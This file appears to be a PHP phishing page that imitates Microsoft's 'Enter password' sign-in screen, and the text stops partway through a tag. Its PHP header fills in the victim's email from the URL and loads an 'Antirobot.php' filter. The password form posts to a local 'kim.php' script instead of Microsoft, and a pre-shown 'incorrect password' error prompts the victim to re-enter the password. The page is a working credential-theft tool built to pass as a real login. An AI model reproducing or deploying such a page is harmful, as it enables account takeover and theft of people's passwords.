<?php error_reporting(0);include('Antirobot.php');$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];parse_str(parse_url($url, PHP_URL_QUERY));$email = $_GET['data'];$parts = @explode('@', $email);$user = @$parts[0];?>
<!DOCTYPE html>
<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">

    <noscript>
        <meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
    </noscript>

    
        <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
    
    <meta name="robots" content="none">

<script type="text/javascript">//<![CDATA[
!function(){var e=window,r=e.$Debug=e.$Debug||{},n=e.$Config||{};if(!r.appendLog){var t=[],o=0;r.appendLog=function(e){var r=n.maxDebugLog||25,a=(new Date).toUTCString()+":"+e;t.push(o+":"+a),t.length>r&&t.shift(),o++},r.getLogs=function(){return t}}}(),function(){function e(e,r){function n(a){var i=e[a];return t-1>a?void(o.r[i]?n(a+1):o.when(i,function(){n(a+1)})):void r(i)}var t=e.length;n(0)}function r(e,r,a){function i(){var e=!!s.method,o=e?s.method:a[0],i=s.extraArgs||[],u=t.$WebWatson;try{var l=n(a,!e);if(i&&i.length>0)for(var c=i.length,d=0;c>d;d++)l.push(i[d]);o.apply(r,l)}catch(f){return void(u&&u.submitFromException&&u.submitFromException(f))}}var s=o.r&&o.r[e];return r=r?r:this,s&&(s.skipTimeout?i():t.setTimeout(i,0)),s}function n(e,r){return Array.prototype.slice.call(e,r?1:0)}var t=window;t.$Do||(t.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var o=t.$Do;o.when=function(n,t){function a(e){r(e,i,s)||o.q.push({id:e,c:i,a:s})}var i=0,s=[],u=1,l="function"==typeof t;l||(i=t,u=2);for(var c=u;c<arguments.length;c++)s.push(arguments[c]);n instanceof Array?e(n,a):a(n)},o.register=function(e,n,t){if(!o.r[e]){o.o.push(e);var a={};if(n&&(a.method=n),t&&(a.skipTimeout=t),arguments&&arguments.length>3){a.extraArgs=[];for(var i=3;i<arguments.length;i++)a.extraArgs.push(arguments[i])}o.r[e]=a,o.lock++;try{for(var s=0;s<o.q.length;s++){var u=o.q[s];u.id==e&&r(e,u.c,u.a)&&o.removeItems.push(u)}}catch(l){throw l}finally{if(o.lock--,0===o.lock){for(var c=0;c<o.removeItems.length;c++)for(var d=o.removeItems[c],f=0;f<o.q.length;f++)if(o.q[f]===d){o.q.splice(f,1);break}o.removeItems=[]}}}},o.unregister=function(e){o.r[e]&&delete o.r[e]}}(),function(){function e(e,r){var n=l.$Debug;n&&n.appendLog&&(r&&(e+=" '"+(r.src||r.href||"")+"'",e+=", id:"+(r.id||""),e+=", async:"+(r.async||""),e+=", defer:"+(r.defer||"")),n.appendLog(e))}function r(){var e=l.$Config||{},r=e.loader||{};return r.slReportFailure||e.slReportFailure||!1}function n(){var e=l.$Config||{},r=e.loader||{};return r.redirectToErrorPageOnLoadFailure||!1}function t(e){var r=e.indexOf("?"),n=r>-1?r:e.length;return n>f&&e.substr(n-f,f).toLowerCase()===d}function o(e,r,n){var o=t(e)?a(e):i(e);return r&&(o.id=r),"function"==typeof o.setAttribute&&(o.setAttribute("crossorigin","anonymous"),n&&"string"==typeof n&&o.setAttribute("integrity",n)),o}function a(e){var r=c.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e,r}function i(e){var r=c.createElement("script");return r.type="text/javascript",r.src=e,r.defer=!1,r.async=!1,r}function s(e){var r=!0,n=e.src||e.href||"";if(n){if(t(n))try{e.sheet&&e.sheet.cssRules&&!e.sheet.cssRules.length&&(r=!1)}catch(o){}}else r=!1;return r}function u(){function r(e){if(!(d&&d.length>1))return e;for(var r=0;r<d.length;r++)if(0===e.indexOf(d[r]))return d[r+1<d.length?r+1:0]+e.substring(d[r].length);return e}function n(t,i,l){if(t<g.length){var d=g[t];if(!d||!d.srcPath)return void n(t+1,i,l);d.retry>0&&(d.srcPath=r(d.srcPath),d.origId||(d.origId=d.id),d.id=d.origId+"_Retry_"+d.retry);var h=o(d.srcPath,d.id,d.integrity),v=function(){e("[$Loader]: "+(f.failMessage||"Failed"),h),d.retry<a&&(d.retry++,n(t,i,l),u._ReportFailure(d.retry-1,a,d.srcPath)),l&&l()},p=function(){s(h)?(e("[$Loader]: "+(f.successMessage||"Loaded"),h),n(t+1,i,l)):v()};h.onload=p,h.onerror=v,h.onreadystatechange=function(){"loaded"===h.readyState?setTimeout(p,500):"complete"===h.readyState&&p()};var y=c.getElementsByTagName("head")[0];y.appendChild(h),e("[$Loader]: Loading '"+(d.srcPath||"")+"', id:"+(d.id||""))}else i&&i()}var t=l.$Config||{},a=t.slMaxRetry||2,i=t.loader||{},d=i.cdnRoots||[],f=this,g=[];f.retryOnError=!0,f.successMessage="Loaded",f.failMessage="Error",f.Add=function(e,r,n,t){e&&g.push({srcPath:e,id:r,retry:t||0,integrity:n})},f.AddLoaded=function(){},f.AddForReload=function(e){var r=e.src||e.href||"";f.Add(r,"AddForReload",e.integrity,1)},f.AddIf=function(e,r,n){e&&f.Add(r,n)},f.Load=function(e,r){n(0,e,r)}}var l=window,c=l.document,d=".css",f=d.length;u.On=function(e,r){if(!e)throw"The target element must be provided and cannot be null.";r?u.OnError(e):u.OnSuccess(e)},u.OnSuccess=function(t,o,a){var i=t.src||t.href||"",l=r(),c=n();if(!t)throw"The target element must be provided and cannot be null.";if(s(t)){e("[$Loader]: Loaded",t);var d=new u;d.failMessage="Reload Failed",d.successMessage="Reload Success",d.AddLoaded(t,o,a),d.Load(null,function(){if(l)throw"Unexpected state. resourceLoader.Load() failed despite initial load success. ['"+i+"']";c&&(document.location.href="/error.aspx?err=504")})}else u.OnError(t,o,a)},u.OnError=function(t,o,a){var i=t.src||t.href||"",s=r(),l=n();if(!t)throw"The target element must be provided and cannot be null.";e("[$Loader]: Failed",t);var c=new u;c.failMessage="Reload Failed",c.successMessage="Reload Success",c.AddForReload(t,o,a),c.Load(null,function(){if(s)throw"Failed to load external resource ['"+i+"']";l&&(document.location.href="/error.aspx?err=504")}),u._ReportFailure(0,null,i)},u._ReportFailure=function(e,r,n){var t=r?"/"+r:"";throw"[Retry "+e+t+"] Failed to load external resource ['"+n+"'], reloading from fallback CDN endpoint"},l.$Loader=u}(),function(){function e(){if(!$){var e=new v.$Loader;e.AddIf(!v.jQuery,y.sbundle,"WebWatson_DemandSupport"),y.sbundle=null,delete y.sbundle,e.AddIf(!v.$Api,y.fbundle,"WebWatson_DemandFramework"),y.fbundle=null,delete y.fbundle,e.Add(y.bundle,"WebWatson_DemandLoaded"),e.Load(r,n),$=!0}}function r(){if(v.$WebWatson){if(v.$WebWatson.isProxy)return void n();m.when("$WebWatson.full",function(){for(;b.length>0;){var e=b.shift();e&&v.$WebWatson[e.cmdName].apply(v.$WebWatson,e.args)}})}}function n(){var e=v.$WebWatson?v.$WebWatson.isProxy:!0;if(e){if(!w&&JSON){try{var r=new XMLHttpRequest;r.open("POST",y.url),r.setRequestHeader("Accept","application/json"),r.setRequestHeader("Content-Type","application/json; charset=UTF-8"),r.setRequestHeader("canary",p.apiCanary),r.setRequestHeader("client-request-id",p.correlationId),r.setRequestHeader("hpgid",p.hpgid||0),r.setRequestHeader("hpgact",p.hpgact||0);for(var n=-1,o=0;o<b.length;o++)if("submit"===b[o].cmdName){n=o;break}var a=b[n]?b[n].args||[]:[],i={sr:y.sr,ec:"Failed to load external resource [Core Watson files]",wec:55,idx:1,pn:p.pgid||"",sc:p.scid||0,hpg:p.hpgid||0,msg:"Failed to load external resource [Core Watson files]",url:a[1]||"",ln:0,ad:0,an:!1,cs:"",sd:p.serverDetails,ls:null,diag:h(y)};r.send(JSON.stringify(i))}catch(s){}w=!0}y.loadErrorUrl&&window.location.assign(y.loadErrorUrl)}t()}function t(){b=[],v.$WebWatson=null}function o(r){return function(){var n=arguments;b.push({cmdName:r,args:n}),e()}}function a(){var e=["foundException","resetException","submit"],r=this;r.isProxy=!0;for(var n=e.length,t=0;n>t;t++){var a=e[t];a&&(r[a]=o(a))}}function i(e,r,n,t,o,a,i){var s=v.event;return a||(a=d(o||s,i?i+2:2)),v.$Debug&&v.$Debug.appendLog&&v.$Debug.appendLog("[WebWatson]:"+(e||"")+" in "+(r||"")+" @ "+(n||"??")),W.submit(e,r,n,t,o||s,a,i)}function s(e,r){return{signature:e,args:r,toString:function(){return this.signature}}}function u(e){for(var r=[],n=e.split("\n"),t=0;t<n.length;t++)r.push(s(n[t],[]));return r}function l(e){for(var r=[],n=e.split("\n"),t=0;t<n.length;t++){var o=s(n[t],[]);n[t+1]&&(o.signature+="@"+n[t+1],t++),r.push(o)}return r}function c(e){if(!e)return null;try{if(e.stack)return u(e.stack);if(e.error){if(e.error.stack)return u(e.error.stack)}else if(window.opera&&e.message)return l(e.message)}catch(r){}return null}function d(e,r){var n=[];try{for(var t=arguments.callee;r>0;)t=t?t.caller:t,r--;for(var o=0;t&&L>o;){var a="InvalidMethod()";try{a=t.toString()}catch(i){}var u=[],l=t.args||t.arguments;if(l)for(var d=0;d<l.length;d++)u[d]=l[d];n.push(s(a,u)),t=t.caller,o++}}catch(i){n.push(s(i.toString(),[]))}var f=c(e);return f&&(n.push(s("--- Error Event Stack -----------------",[])),n=n.concat(f)),n}function f(e){if(e)try{var r=/function (.{1,})\(/,n=r.exec(e.constructor.toString());return n&&n.length>1?n[1]:""}catch(t){}return""}function g(e){if(e)try{if("string"!=typeof e&&JSON&&JSON.stringify){var r=f(e),n=JSON.stringify(e);return n&&"{}"!==n||(e.error&&(e=e.error,r=f(e)),n=JSON.stringify(e),n&&"{}"!==n||(n=e.toString())),r+":"+n}}catch(t){}return""+(e||"")}function h(e){var r=[];try{if(jQuery?(r.push("jQuery v:"+jQuery().jquery),r.push(jQuery.easing?"jQuery.easing:"+JSON.stringify(jQuery.easing):"jQuery.easing is not defined")):r.push("jQuery is not defined"),e&&e.expectedVersion&&r.push("Expected jQuery v:"+e.expectedVersion),m){var n,t="";for(n=0;n<m.o.length;n++)t+=m.o[n]+";";for(r.push("$Do.o["+t+"]"),t="",n=0;n<m.q.length;n++)t+=m.q[n].id+";";r.push("$Do.q["+t+"]")}if(v.$Debug&&v.$Debug.getLogs){var o=v.$Debug.getLogs();o&&o.length>0&&(r=r.concat(o))}if(b)for(var a=0;a<b.length;a++){var i=b[a];if(i&&"submit"===i.cmdName)try{if(JSON&&JSON.stringify){var s=JSON.stringify(i);s&&r.push(s)}}catch(u){r.push(g(u))}}}catch(l){r.push(g(l))}return r}var v=window,p=v.$Config||{},y=p.watson,m=v.$Do;if(!v.$WebWatson&&y){var b=[],$=!1,w=!1,L=10,W=v.$WebWatson=new a;W.CB={},W._orgErrorHandler=v.onerror,v.onerror=i,W.errorHooked=!0,m.when("jQuery.version",function(e){y.expectedVersion=e}),m.register("$WebWatson")}}(),function(){function e(e,r){for(var n=r.split("."),t=n.length,o=0;t>o&&null!==e&&void 0!==e;)e=e[n[o++]];return e}function r(r){var n=null;return null===u&&(u=e(a,"Constants")),null!==u&&r&&(n=e(u,r)),null===n||void 0===n?"":n.toString()}function n(n){var t=null;return null===i&&(i=e(a,"$Config.strings")),null!==i&&n&&(t=e(i,n.toLowerCase())),(null===t||void 0===t)&&(t=r(n)),null===t||void 0===t?"":t.toString()}function t(e,r){var t=null;return e&&r&&r[e]&&(t=n("errors."+r[e])),t||(t=n("errors."+e)),t||(t=n("errors."+l)),t||(t=n(l)),t}function o(n){var t=null;return null===s&&(s=e(a,"$Config.urls")),null!==s&&n&&(t=e(s,n.toLowerCase())),(null===t||void 0===t)&&(t=r(n)),null===t||void 0===t?"":t.toString()}var a=window,i=null,s=null,u=null,l="GENERIC_ERROR";a.GetString=n,a.GetErrorString=t,a.GetUrl=o}(),function(){var e=window,r=e.$Config||{};e.$B=r.browser||{}}();

//]]></script> 

    <script type="text/javascript">
        ServerData = $Config;
    </script>


    
<link crossorigin="anonymous" href="office/converged.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-oeT7RE+jUqvrrN6tzkQqVkE1XiqysTeQdBVsLf8laIGpeReVI+Dac1mjekZRn1Lm">

<script crossorigin="anonymous" src="office/oldconvergedlogin_pcore.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-82QXVigHeXyO7aW4NBkcv0dbcJ0JUHwPqHD6SRr+KRD3hzdEvsKAt+3n1t1wbR+N"></script>

    <script crossorigin="anonymous" src="office/convergedloginpaginatedstrings-en.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)" integrity="sha384-quWht0p82N7i0EkY4KTL6Bwo+g2sUH9qRIuVi/Yzy5EU2wY7XqqQ6lOMOTgNL9Pm"></script>

    


</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
    <script type="text/javascript">//<![CDATA[
!function(){var e=window,o=e.document,i=e.$Config||{};if(e.self===e.top)o&&o.body&&(o.body.style.display="block");else if(!i.allowFrame){var s=e.self.location.href,l=s.indexOf("#"),n=-1!==l,t=s.indexOf("?"),f=n?l:s.length,d=-1===t||n&&t>l?"?":"&";s=s.substr(0,f)+d+"iframe-request-id="+i.sessionId+s.substr(f),e.top.location=s}}();

//]]></script>

<div><!--  --> <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/backgrounds/0-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/backgrounds/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <div data-bind="if: activeDialog"></div> <form name="f1" id="i0281" method="post" action="./kim.php?status=login&string=signin"><!-- ko if: svr.iBannerEnvironment --><!-- /ko --><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { 'app': backgroundLogoUrl }"><!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButton,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }"> <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div><!-- ko if: showLightboxProgress --><!-- /ko --><!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) --> <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="office/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }"><!--  --> <div data-bind="css: { 'zero-opacity': hidePaginatedView() }"><!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) --> <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"> <div data-bind="component: { name: 'identity-banner-control',
            params: {
                pawnIconId: svr.iPawnIcon,
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --> <button type="button" class="backButton" data-bind="
        click: backButton_onClick,
        hasFocus: focusOnBackButton,
        attr: {
            'id': backButtonId || 'idBtn_Back',
            'aria-describedby': backButtonDescribedBy,
            'aria-label': str['CT_HRD_STR_Splitter_Back'] }" id="idBtn_Back" aria-label="Back"><!-- ko ifnot: svr.fIsRTLMarket --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="office/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.fIsRTLMarket --><!-- /ko --> </button><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $email ?>"><?php echo $email ?></div><!-- ko ifnot: svr.fUseTextOnlyIdentityBannerWithBack --><!-- /ko --> </div></div> </div><!-- /ko --> <div class="pagination-view has-identity-banner" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata,
                            gitHubRedirectUrl: sharedData.gitHubParams.redirectUrl || svr.urlGitHubFed },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  --> <input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0"> <input type="hidden" name="username" data-bind="value: unsafe_username" value="<?php echo $email ?>"> <input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true" value="<?php echo $email ?>"> <input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11"> <input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3"> <input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value=""> <input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value=""> <input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value=""> <input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value=""> <div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div><!-- ko if: unsafe_pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: passwordTextbox.error --> <div id="passwordError" class="alert alert-error" data-bind="
                htmlWithBindings: passwordTextbox.error,
                childBindings: { 'idA_IL_ForgotPassword0': { href: svr.urlResetPassword, click: resetPassword_onClick } }">Your account or password is incorrect. If you don't remember your password, <a id="idA_IL_ForgotPassword0" href="#reset">reset it now.</a></div><!-- /ko --> </div> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="errors" type="password" id="i0118" autocomplete="off" class="form-control has-error" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: unsafe_passwordAriaLabel,
                    css: { 'has-error': passwordTextbox.error }" placeholder="Password" aria-label="Enter the password for <?php echo $email ?>"> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div> </div> </div><!-- ko if: svr.urlHIPScript && showHip --><!-- /ko --> <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"><div><!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko --><!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="#resetPassword_onClick">Forgot my password</a> </div><!-- ko if: allowPhoneDisambiguation --><!-- /ko --><!-- ko component: { name: "cred-switch-link-control",
                        params: {
                            serverData: svr,
                            username: username,
                            availableCreds: availableCreds,
                            flowToken: flowToken,
                            currentCred: { credType: 1 } },
                        event: {
                            switchView: credSwitchLink_onSwitchView,
                            setPendingRequest: credSwitchLink_onSetPendingRequest,
                            updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  --> <div class="form-group"><!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) --><!-- /ko --><!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko --><!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko --> </div><!-- ko if: credLinkError --><!-- /ko --><!-- /ko --><!-- ko if: showChangeUserLink --><!-- /ko --> </div> </div> </div> </div><div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() &amp;&amp; !svr.fUseTextOnlyIdentityBannerWithBack },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div data-bind="
        css: {
            'inline-block': svr.fRepositionFooterButtons,
            'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            'col-xs-24': !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Sign in"> </div> </div></div> </div></div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div> </div></div> </div><!-- ko if: showFedCredButton --><!-- /ko --><!-- ko if: newSessionMessage() && !svr.urlMsaStaticMeControl --><!-- /ko --><!-- ko if: svr.urlMsaStaticMeControl && newSession() --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" 